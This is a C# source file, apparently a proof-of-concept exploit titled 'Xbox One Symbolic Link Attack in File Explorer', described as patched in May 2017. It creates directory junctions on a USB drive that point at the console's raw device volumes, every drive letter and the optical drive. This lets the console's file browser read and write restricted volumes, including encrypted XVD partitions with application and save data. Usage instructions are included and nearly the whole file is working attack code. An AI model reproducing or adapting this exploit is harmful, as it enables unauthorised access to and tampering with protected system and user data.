/*
 * Xbox One Symbolic Link Attack in File Explorer
 * (Patched as of 5/5/2017: 10.0.15063.2022 (RS2_RELEASE_XBOX_1704.170501-1052))
 * 
 * Allows for a user to browse/read/write to mounted volumes which are normally restricted.
 * This includes encrypted virtual harddisk partitions (XVD files) which the console uses
 * for the majority of content, such as application/gamesave volumes, etc.
 * 
 * Instructions:
 * -Change the drive letter to your USB drive letter below.
 * -Run this
 * -Plug it into Xbox, use File Browser to browse through the symlinks, which will link to other parts of the system.
 */
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace xsymlink
{
    class Program
    {
        public static string UsbDriveLetter = "F"; // CHANGE THIS TO YOUR USB DRIVE LETTER!
        private static bool LinkAllDriveLetters = true;
        private static bool LinkVolumeByNumber = true;
        private static bool LinkCdrom = true;
        static void Main(string[] args)
        {
            // Create the symlink directory on our USB.
            string symLinkPath = string.Format("{0}:\\symlinks", UsbDriveLetter);
            if(!Directory.Exists(symLinkPath))
                Directory.CreateDirectory(symLinkPath);

            if (LinkVolumeByNumber)
            {
                // We'll link volumes by index 1-20
                for (int i = 1; i <= 20; i++)
                {
                    // Determine the directory to link from->to.
                    string destPath = string.Format(@"\\?\GLOBALROOT\Device\HarddiskVolume{0}\", i.ToString());
                    string linkPath = string.Format("{0}\\Volume{1}\\", symLinkPath, i.ToString());

                    // Call on command prompt to execute mklink with the given directory paths.
                    Execute("linkd", string.Format("{0} {1}", linkPath, destPath));
                }
            }

            if (LinkAllDriveLetters)
            {
                // Loop for every possible drive letter.
                for (char i = 'A'; i <= 'Z'; i++)
                {
                    // Obtain a string of our current drive letter
                    string curDriveLetter = i.ToString();

                    // Determine the directory to link from->to.
                    string destPath = string.Format("{0}:\\", curDriveLetter);
                    string linkPath = string.Format("{0}\\{1}\\", symLinkPath, curDriveLetter);

                    // Call on command prompt to execute mklink with the given directory paths.
                    Execute("linkd", string.Format("{0} {1}", linkPath, destPath));
                }
            }

            if (LinkCdrom)
            {
                // Determine the directory to link from->to.
                string destPath = @"\\?\GLOBALROOT\Device\Cdrom0\";
                string linkPath = string.Format("{0}\\Cdrom0\\", symLinkPath);

                // Call on command prompt to execute mklink with the given directory paths.
                Execute("linkd", string.Format("{0} {1}", linkPath, destPath));
            }

            Console.WriteLine("Press any key to continue...");
            Console.ReadLine();
        }
        private static void Execute(string command, string arguments)
        {
            // Create a process given the command and arguments.
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = command;
            p.StartInfo.Arguments = arguments;
            p.Start();

            // Wait until execution has concluded.
            p.WaitForExit();

            // Print out the output
            string output = p.StandardOutput.ReadToEnd();
            Console.WriteLine(output);
        }
    }
}
